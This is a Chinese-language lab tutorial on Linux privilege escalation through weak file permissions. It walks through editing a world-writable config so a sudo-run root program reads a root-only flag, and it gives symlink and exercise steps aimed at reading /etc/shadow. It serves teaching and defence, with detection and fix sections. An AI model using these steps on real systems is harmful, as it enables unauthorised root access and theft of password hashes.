# Day 10：Writable 不等於 Vulnerable — 弱檔案權限真正危險在哪？


---

## 開場

系統上有一個 config 檔案，fei-student 可以修改它。

「可以修改一個檔案」——這句話本身完全不是漏洞。你每天都在修改自己 home 目錄下的檔案。

但如果 root 會讀取那個 config、依據內容執行操作呢？

---

## 今天要解決的問題

1. 「Writable file」什麼時候是漏洞，什麼時候不是？
2. 「信任關係」（Trust Boundary）怎麼理解？
3. 高權限 Process 信任了一個低權限使用者可修改的 config 時，會怎樣？
4. 和 L03 PATH / L04 Cron 有什麼不同？

---

## 背景知識

### Writable ≠ Vulnerable

這是本篇最重要的觀念。

```
/tmp 是 world-writable → 任何人都能寫 → 正常，不是漏洞

/opt/fei-privesc/training/L06/fei-runner.conf 是 world-writable
  + root 會讀它並依內容行動
  → 這才可能是漏洞
```

### Trust Relationship 模型

![Trust Relationship 模型](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day10-weak-file-permissions-diagram-01.png)



只有三層都成立時，才構成可利用的漏洞：

1. **低權限使用者可修改資源** ✓
2. **高權限 Process 信任並使用該資源** ✓
3. **資源內容可以影響高權限行為** ✓

---

## OS 原理：Linux File Permission Model

### 基本模型（owner/group/others）

![Linux owner、group、others 權限模型](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day10-weak-file-permissions-diagram-02.png)



**0666** = owner rw- + group rw- + others rw-

所有人都可以修改這個檔案。

### 延伸機制

| 機制 | 說明 |
|------|------|
| POSIX ACL | 更細粒度的存取控制（`getfacl`/`setfacl`）|
| SELinux | Mandatory Access Control，限制 process 可存取的資源 |
| AppArmor | Profile-based MAC |
| umask | 控制新檔案的預設權限 |

在我們的 Lab 中，只使用基本的 Unix permission model。

### Parent Directory 也很重要

```bash
$ ls -la /opt/fei-privesc/training/L06/
drwxr-xr-x root root .
-rw-rw-rw- root root fei-runner.conf    ← 可寫
-rw-r--r-- root root status.txt         ← 不可寫
```

即使 config 檔案本身不可寫，如果 **parent directory** 是 writable，攻擊者可以刪除原檔案並重建一個新的。

---

## 🔬 FEI Lab 環境

```
Scenario:   FEI-L06-WEAK-FILE-PERMISSIONS
VM:         FEI-PRIVESC-LINUX (Ubuntu 22.04.4 LTS)
起始帳號:   fei-student
目標:       root
Flag:       /root/fei-l06-flag.txt
```



### 場景準備

`ash
# 1. 以 fei-labadmin 登入
ssh fei-labadmin@192.168.77.10
# 密碼：FEI-LabAdmin-2026!

# 2. 進入場景目錄並 setup
cd /opt/fei-privesc/scenarios/FEI-L06-WEAK-FILE-PERMISSIONS
sudo ./fei-setup.sh

# 3. 確認場景就緒
sudo ./fei-verify.sh
# 應看到 L06-WEAK-FILE-PERMISSIONS STATUS: READY

# 4. 切換到 fei-student
su - fei-student
# 密碼：FEI-Student-2026!
`

### 部署過程

setup 建立了：

1. **Runner** `/usr/local/bin/fei-l06-runner`（root:root 755）
   - 讀取 config 中的 `TARGET_FILE` 值
   - 以 `/bin/cat` 顯示該檔案
   - 使用絕對路徑（PATH 不可利用）
   - fei-student 不可修改
2. **Config** `/opt/fei-privesc/training/L06/fei-runner.conf`（root:root **0666**！）
3. **Sudo rule**：只允許 `sudo /usr/local/bin/fei-l06-runner`
4. **Flag** `/root/fei-l06-flag.txt`（0600 root:root）

verify 確認了 18 項：

```
[PASS] runner owned by root
[PASS] fei-student cannot modify runner
[PASS] config is writable by fei-student
[PASS] runner consumes config (TARGET_FILE)
[PASS] absolute paths used (/bin/cat)
[PASS] no PATH hijack dependency
[PASS] no SUID weakness (L02 absent)
[PASS] no capability weakness (L05 absent)
[PASS] no cron weakness (L04 absent)
```

---

## 完整攻擊流程

### Step 1：發現 sudo 權限

```bash
fei-student@fei-privesc-linux:~$ sudo -l
(root) NOPASSWD: /usr/local/bin/fei-l06-runner
```

### Step 2：讀取 runner 了解行為

```bash
fei-student@fei-privesc-linux:~$ cat /usr/local/bin/fei-l06-runner
#!/bin/bash
CONFIG="/opt/fei-privesc/training/L06/fei-runner.conf"
...
TARGET_FILE=$(grep "^TARGET_FILE=" "$CONFIG" | head -1 | cut -d'=' -f2)
...
/bin/cat "$TARGET_FILE"
```

Runner 讀 config → 取得 TARGET_FILE → 用 `/bin/cat` 顯示它。

### Step 3：檢查 config 權限

```bash
fei-student@fei-privesc-linux:~$ ls -la /opt/fei-privesc/training/L06/fei-runner.conf
-rw-rw-rw- 1 root root 84 ... fei-runner.conf
```

**-rw-rw-rw-** (0666) — 所有人可寫！

### Step 4：讀取 config 目前內容

```bash
fei-student@fei-privesc-linux:~$ cat /opt/fei-privesc/training/L06/fei-runner.conf
# FEI Lab Runner Configuration
TARGET_FILE=/opt/fei-privesc/training/L06/status.txt
```

目前指向 `status.txt`（benign）。

### Step 5：Attack Hypothesis

![Weak File Permission Attack Hypothesis](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day10-weak-file-permissions-diagram-03.png)



### Step 6：修改 config

```bash
fei-student@fei-privesc-linux:~$ echo "TARGET_FILE=/root/fei-l06-flag.txt" > /opt/fei-privesc/training/L06/fei-runner.conf
```

### Step 7：觸發

```bash
fei-student@fei-privesc-linux:~$ sudo /usr/local/bin/fei-l06-runner
[FEI Lab Status] Reading: /root/fei-l06-flag.txt
FEI{LINUX_L06_WEAK_FILE_PERMISSION_ROOT_ACCESS}
```

---

## Attack Path

![Weak File Permission Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day10-weak-file-permissions-diagram-04.png)



---

## Attack Reasoning

### 壞掉的 Security Boundary

```
Runner (root):     protected ✓ (755 root:root)
Sudo Rule:         scoped ✓ (只允許 runner)
Absolute Path:     ✓ (/bin/cat)
Config (writable): ✗ (0666！任何人可改)
```

Runner 的安全設定都正確。但它**信任了 config 的內容**，而 config 可以被攻擊者修改。

這是一個**信任鏈斷裂**：

```
Root Context → 信任 Config → Config 被低權限使用者控制
                               ↑
                          Security Boundary 在這裡斷裂
```

---

## False Positive

### `/tmp` 是 world-writable，這是漏洞嗎？

不是。`/tmp` 本來就設計給所有使用者寫入。除非有高權限 process 信任 `/tmp` 裡的內容，否則 `/tmp` writable 不構成漏洞。

### 常見誤判

| 情況 | 漏洞？ |
|------|--------|
| `/tmp` writable | ❌ 正常設計 |
| `/var/log/some.log` writable | ❌ 除非有 root 程式 source 它 |
| config writable + 沒有高權限 consumer | ❌ 沒有利用途徑 |
| config writable + root consumer + 不影響行為 | ❌ 即使可修改，如果 root 只讀不用也沒關係 |
| config writable + root consumer + 影響執行路徑 | ✅ 本題的情況 |

### 判斷清單

```
✓ 檔案可被低權限使用者修改
+ ✓ 高權限 Process 使用該檔案
+ ✓ 檔案內容影響高權限行為
+ ✓ 攻擊者可以預測/觸發使用時機
= 可能的提權路徑
```

---

## Edge Case

### Parent Directory Writable

即使 config 是 `0644`（不可寫），如果 parent directory 是 `0777`：

```bash
# fei-student 可以：
rm fei-runner.conf           # 刪除（因為目錄可寫）
echo "TARGET_FILE=/root/flag" > fei-runner.conf  # 重建
```

所以**不只要檢查檔案權限，還要檢查目錄權限**。

### Symlink Attack

如果 runner 跟隨 symlink：

```bash
rm fei-runner.conf
ln -s /etc/shadow fei-runner.conf
```

runner 可能會讀到 `/etc/shadow` 而不是正常 config。

### Race Condition

如果 config 在 runner 讀取前/後被修改（TOCTOU），可能導致不一致的行為。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| 修改 config 但 runner 沒反應 | 語法格式錯誤 | 確認 `TARGET_FILE=` 格式正確 |
| runner 報 `Config not found` | 路徑打錯 | 確認 config 路徑 |
| runner 報 `TARGET_FILE not set` | config 格式不對 | 用 `grep "^TARGET_FILE="` 測試 |
| Permission denied 修改 config | config 不是 0666 | 用 `ls -la` 確認 |

---

## 防禦

### Detect

```bash
# 找出 root 程式信任的所有 config
# 檢查這些 config 的權限
find /opt /etc /usr/local -name "*.conf" -o -name "*.cfg" -o -name "*.ini" | \
  xargs ls -la 2>/dev/null | grep -E "^-.{2}w.{3}w|^-.{5}w"
```

### Prevent

```bash
# 正確的 config 權限
chmod 644 /opt/fei-privesc/training/L06/fei-runner.conf  # root 可寫，其他人只能讀
chown root:root /opt/fei-privesc/training/L06/fei-runner.conf

# 正確的 parent directory 權限
chmod 755 /opt/fei-privesc/training/L06/
```

### Fix Verification

```bash
# 修正後
ls -la /opt/fei-privesc/training/L06/fei-runner.conf
# 應看到 -rw-r--r-- root root

# 驗證 fei-student 不能修改
su - fei-student
echo test >> /opt/fei-privesc/training/L06/fei-runner.conf
# Permission denied
```

---

## Detection

| 監控 | 方法 |
|------|------|
| Config 被修改 | `inotifywait -m /opt/.../fei-runner.conf` |
| World-writable root-consumed files | 定期稽核 |
| 異常 TARGET_FILE 值 | 在 runner 中加入 path validation |

---

## L03 / L04 / L06 比較

| | L03 PATH | L04 Cron | L06 Config |
|---|---------|----------|------------|
| 攻擊者控制的是 | PATH 中的候選 binary | 被排程執行的 script | 被 runner 讀取的 config |
| 消費者 | sudo 執行的 maintenance script | cron daemon (root) | sudo 執行的 runner (root) |
| 觸發方式 | 手動 sudo | 自動（每分鐘）| 手動 sudo |
| 需要等待 | 否 | 是（≤60s）| 否 |
| 使用絕對路徑 | 否（漏洞原因）| 是 | 是 |

共同點：**都是高權限 process 信任了低權限使用者可控制的資源。**

---

## Exercise

1. 把 config 改成 `TARGET_FILE=/etc/shadow`，能讀到密碼 hash 嗎？
2. 如果 runner 在讀 TARGET_FILE 之前有做 path validation（只允許 `/opt/` 下的路徑），你還能提權嗎？
3. 建立一個 symlink 指向 `/etc/shadow`，然後把 config 改成指向 symlink。Runner 會跟隨嗎？

---

## Quiz

**Q1**：一個 world-writable 的檔案一定是漏洞嗎？

### 答案

不一定。Writable ≠ Vulnerable。只有當高權限 Process 信任並使用該檔案，且檔案內容可以影響高權限行為時，才構成漏洞。`/tmp` 是 world-writable 但不是漏洞，因為正常情況下沒有高權限 process 信任 `/tmp` 裡的檔案。



**Q2**：本題的 runner 使用了絕對路徑（`/bin/cat`），為什麼 L03 的 PATH Hijacking 不適用？

### 答案

因為 runner 呼叫的是 `/bin/cat`（絕對路徑），不是 `cat`（相對命令）。絕對路徑直接指定了要執行的程式，不需要 PATH 搜尋，所以 PATH 中的 writable 目錄不會影響執行結果。




## 場景收尾

做完後記得 reset，避免影響下一題：

```bash
# 以 fei-labadmin 執行
ssh fei-labadmin@192.168.77.10
cd /opt/fei-privesc/scenarios/FEI-L06-WEAK-FILE-PERMISSIONS
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 應看到 L06-WEAK-FILE-PERMISSIONS STATUS: RESET
```

---

## 今天真正要記住的 3 件事

1. **Writable file 本身不是漏洞**。必須同時有：高權限消費者 + 影響行為 + 可觸發。
2. **信任關係是提權的核心概念**。從 L01 到 L06，每一題都是「高權限主體信任了低權限使用者可控制的東西」。
3. **不要只看檔案權限，還要看 parent directory 權限**。Directory writable 可能允許刪除+重建檔案。

---

## 給自己的問題

> 到目前為止都是找「錯誤的設定」。但如果系統裡就放著一組密碼呢？不需要任何 exploit——找到 credential 就是提權。

→ Day 11：Credential Hunting

---

## Lab Reset

```bash
cd /opt/fei-privesc/scenarios/FEI-L06-WEAK-FILE-PERMISSIONS
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# FEI-L06 STATUS: RESET
```
